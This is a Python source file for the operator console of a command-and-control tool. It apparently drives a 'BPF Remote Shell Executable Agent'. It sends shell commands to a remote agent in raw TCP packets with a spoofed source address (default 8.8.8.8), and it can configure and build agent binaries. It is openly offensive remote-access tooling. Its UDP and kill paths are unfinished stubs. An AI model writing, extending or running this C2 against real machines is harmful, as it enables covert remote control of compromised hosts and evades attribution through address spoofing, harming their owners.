import c2.parse as c2parser
import shlex
from typing import Optional
from pathlib import Path
from cmd import Cmd
from c2.view import C2View
from c2.c2 import C2


class C2Cmd(Cmd):
    """Command line interface for the BPF Remote Shell Executable Agent."""

    prompt = C2View.colored_text("BPF EXEC> ", "C9C9EE")

    def __init__(self, completekey="tab", stdin=None, stdout=None):
        super().__init__(completekey, stdin, stdout)
        self.c2: C2 = None

    def _add_common_opts(self, parser: c2parser.C2Parser) -> None:
        """Adds common options to the parser for shell and kill commands.

        Args:
            parser (c2parser.C2Parser): Custom parser to add common options to.
        """

        parser.add_argument(
            "--sip",
            type=str,
            help="Source IP address for the Raw packet (default: 8.8.8.8)",
            default="8.8.8.8",
        )
        parser.add_argument(
            "--dip",
            type=str,
            help="Destination IP address for the Raw packet",
            required=True,
        )
        parser.add_argument(
            "--sport",
            type=int,
            default=4444,
            help="Source port for the Raw packet (default: 4444)",
        )
        parser.add_argument(
            "--dport",
            type=int,
            default=4444,
            help="Destination port for the Raw packet (default: 4444)",
        )

    def do_shell(self, arg: str) -> None:
        """Sends a shell command to the configured agent.

        Args:
            arg (str): Command line arguments for the shell command.
        """
        parser = c2parser.C2Parser(
            description="Send a shell command to the configured agent.",
            prog="shell",
        )
        subparsers = parser.add_subparsers(dest="protocol", required=True)

        tcp_parser = subparsers.add_parser("tcp", help="Send a shell command over TCP")
        self._add_common_opts(tcp_parser)
        tcp_parser.add_argument(
            "--seq",
            type=int,
            default=5445,
            help="Sequence number for TCP Raw packet (default: 5445)",
        )

        tcp_parser.add_argument(
            "command",
            type=str,
            help="Shell command to send to the agent",
        )

        udp_parser = subparsers.add_parser("udp", help="Send a shell command over UDP")
        self._add_common_opts(udp_parser)
        udp_parser.add_argument(
            "command",
            type=str,
            help="Shell command to send to the agent",
        )

        try:
            shell_args = parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return

        if shell_args.protocol == "tcp":
            self.c2.tcp_raw_send(shell_args)
        elif shell_args.protocol == "udp":
            pass

    def do_kill(self, arg: str) -> None:
        """Kills the configured agent, agent will exit gracefully.

        Args:
            arg (str): Command line arguments for the kill command.
        """
        parser = c2parser.C2Parser(
            description="Kill the configured agent.",
            prog="kill",
        )
        subparsers = parser.add_subparsers(dest="protocol", required=True)

        tcp_parser = subparsers.add_parser("tcp", help="Send a shell command over TCP")
        self._add_common_opts(tcp_parser)
        udp_parser = subparsers.add_parser("udp", help="Send a shell command over UDP")
        self._add_common_opts(udp_parser)
        try:
            kill_args = parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return

    def do_configure(self, arg: str) -> None:
        """Stamps the BPF Remote Shell Executable Agent with the provided arguments.

        Args:
            arg (str): Command line arguments for the configuration command.
        """
        parser = c2parser.C2Parser(
            description="Configure the BPF Remote Shell Executable Agent.",
            prog="configure",
        )

        parser.add_argument("--name", type=str, help="Name of the agent", required=True)
        parser.add_argument(
            "--output", type=str, help="Output file for the agent", default="."
        )
        parser.add_argument(
            "--seq",
            type=int,
            default=5445,
            help="Sequence number for tcp raw send",
        )

        try:
            config_args = parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return
        self.c2.configure(config_args)

    def do_exit(self, arg: str) -> Optional[bool]:
        """Exits the command loop.

        Args:
            arg (str): Command line arguments for the exit command.

        Returns:
            Optional[bool]: Returns True to indicate exit as specified by the cmd module.
        """
        parser = c2parser.C2Parser(description="Exit the command loop", prog="exit")
        try:
            parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return
        self.c2.view.print_msg("Goodbye.")
        return True

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""
        parser = c2parser.C2Parser(
            description="Shows all available commands", prog="help"
        )
        try:
            parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return

        names = self.get_names()
        self.c2.view.print_msg(
            "Type <command> --help for more information on a specific command.\n"
        )
        self.c2.view.print_msg("Available commands:")
        for name in names:
            if name.startswith("do_"):
                cmd_name = name[3:]
                self.c2.view.print_msg(f"  {cmd_name}")
